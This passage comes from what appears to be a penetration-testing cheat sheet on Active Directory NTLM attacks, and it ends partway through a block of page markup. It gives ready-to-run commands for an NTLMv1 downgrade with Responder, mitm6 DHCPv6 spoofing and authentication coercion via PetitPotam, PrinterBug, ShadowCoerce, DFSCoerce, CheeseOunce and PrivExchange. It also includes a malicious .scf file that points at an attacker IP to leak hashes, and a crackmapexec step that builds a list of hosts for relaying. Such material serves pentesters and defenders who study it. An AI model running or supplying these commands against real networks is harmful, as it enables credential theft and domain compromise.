<p id="bkmrk-force-ntlm-downgrade">Force NTLM downgrade to NTLMv1 (will break the authentications if v1 is disabled on the machine):</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 412px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 412.333px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># --disable-ess will disable the SSP, not always usefull</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">responder <span class="cm-attribute">-I</span> interface_to_use <span class="cm-attribute">-wdDv</span> <span class="cm-attribute">--lm</span> <span class="cm-attribute">--disable-ess</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-ntlmv1-response-can-"><strong>NTLMv1</strong> response can be cracked on <a href="https://crack.sh/">crash.sh</a>.</p>
<h4 id="bkmrk-leak-files">Leak Files</h4>
<p id="bkmrk-with-write-rights-on">With write rights on a SMB share, it is possible to drop a <code>.scf</code> file with the following content to grab some user hashes:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 325.476px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[Shell]</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Command=2</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IconFile=\&lt;attacker_IP&gt;\share\pentestlab.ico</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[Taskbar]</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Command=ToggleDesktop</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 160px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-mitm6">MITM6</h4>
<p id="bkmrk-spoof-dhcpv6-respons">Spoof DHCPv6 responses. Usefull to combine with NTLM or Kerberos Relay attacks.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 303.762px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mitm6 <span class="cm-attribute">-i</span> interface_to_use <span class="cm-attribute">-d</span> domain.local</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-petitpotam-%2F-printer">PetitPotam / PrinterBug / ShadowCoerce / DFSCoerce / CheeseOunce</h4>
<p id="bkmrk-exploits-to-coerce-n">Exploits to coerce Net-NTLM authentication from a computer. <strong>PetitPotam</strong> can be used without any credentials if no patch has been installed.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true" style="bottom: 10px;"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 629px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true" style="height: 10px; width: 10px;"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 314px; min-width: 629.476px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PetitPotam</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">PetitPotam</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">attacker_IP</span> <span class="cm-identifier">target_IP</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#PrinterBug</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">SpoolSample</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">target_IP</span> <span class="cm-identifier">attacker_IP</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#ShadowCoerce</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">python3</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">shadowcoerce</span><span class="cm-punctuation">.</span><span class="cm-identifier">py</span> <span class="cm-operator">-</span><span class="cm-identifier">d</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">u</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">p</span> <span class="cm-identifier">password</span> <span class="cm-identifier">attacker_IP</span> <span class="cm-identifier">target_IP</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#DFSCoerce</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">python3</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">dfscoerce</span><span class="cm-punctuation">.</span><span class="cm-identifier">py</span> <span class="cm-operator">-</span><span class="cm-identifier">u</span> <span class="cm-identifier">user1</span> <span class="cm-operator">-</span><span class="cm-identifier">d</span> <span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">listener_IP</span><span class="cm-operator">&gt;</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target_IP</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#CheeseOunce via MS-EVEN</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">MS-EVEN</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">listener_IP</span><span class="cm-operator">&gt;</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target_IP</span><span class="cm-operator">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 314px;"></div><div class="CodeMirror-gutters" style="height: 364px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-mssql-coerce">MSSQL Coerce</h4>
<p id="bkmrk-everything-is-explai">Everything is explained <a href="https://github.com/p0dalirius/MSSQL-Analysis-Coerce/blob/main/README.md">here</a>.</p>
<ul id="bkmrk-mssql-server-%3A-with-"><li>MSSQL Server : with <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-rbcd-from-mssql-serv">xp_dirtree</a>.</li>
</ul><h4 id="bkmrk-privexchange">PrivExchange</h4>
<p id="bkmrk-coerce-exchange-serv">Coerce Exchange server authentication via <strong>PushSubscription</strong> (now patched):</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 687px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 687.381px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 privexchange.py <span class="cm-attribute">-ah</span> attacker_IP &lt;Exchange_server&gt; <span class="cm-attribute">-u</span> user1 <span class="cm-attribute">-p</span> password <span class="cm-attribute">-d</span> domain.local</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-webclient-service">WebClient Service</h4>
<p id="bkmrk-if-this-service-runs">If this service runs on the target machine, a SMB authentication can be switched into an HTTP authentication (really useful for NTLM relay).</p>
<p id="bkmrk-check-if-webclient-i">Check if WebClient is running on machines:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 477px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 98px; min-width: 477.476px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GetWebDAVStatus.exe <span class="cm-string">'machine_ip'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#For multiple machines</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">webclientservicescanner domain.local/user1:password@10.10.10.0/24</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 98px;"></div><div class="CodeMirror-gutters" style="height: 148px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-if-yes%2C-coerce-the-a">If yes, coerce the authentication to the port 80 on the attacker IP. To bypass trust zone restriction, the attacker machine must be specified with a valid <strong>NETBIOS name</strong> and not its IP. the FQDN can be obtained with Responder in Analyze mode.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 434px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 98px; min-width: 434.048px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">responder</span> <span class="cm-operator">-</span><span class="cm-identifier">I</span> <span class="cm-identifier">interface_to_use</span> <span class="cm-operator">-</span><span class="cm-identifier">A</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Coerce with PetitPotam for example</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">PetitPotam</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-string">"attacker_NETBIOS@80/test.txt"</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target_IP</span><span class="cm-operator">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 98px;"></div><div class="CodeMirror-gutters" style="height: 148px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-ntlm-relay">NTLM Relay</h3>
<h4 id="bkmrk-smb-without-signing">SMB without signing</h4>
<p id="bkmrk-create-a-list-of-com">Create a list of computer without SMB signing:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 564px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 564.333px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">crackmapexec smb <span class="cm-number">10</span>.10.10.0/24 <span class="cm-attribute">-u</span> user1 <span class="cm-attribute">-p</span> password <span class="cm-attribute">--gen-relay-list</span> list.txt</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 